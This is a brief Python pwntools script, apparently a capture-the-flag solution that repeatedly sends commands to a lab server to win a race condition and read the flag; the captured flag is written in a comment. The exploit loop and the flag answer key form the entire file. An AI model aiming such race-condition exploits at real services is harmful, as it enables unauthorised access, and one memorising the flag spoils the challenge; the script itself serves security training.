#!/usr/bin/env python3

from pwn import *

# FLAG{R@c3_r@ce_c0nditi0n5!!!}

URL = "up.zoolab.org"
PORT = 10931

r = remote(URL, PORT)

for i in range(1024):
    r.sendline(b"R")
    r.sendline(b"flag")
    msg = r.recvline().decode()
    msg = r.recvline().decode()
    if "FLAG" in msg:
        print(msg)
        break

r.interactive()
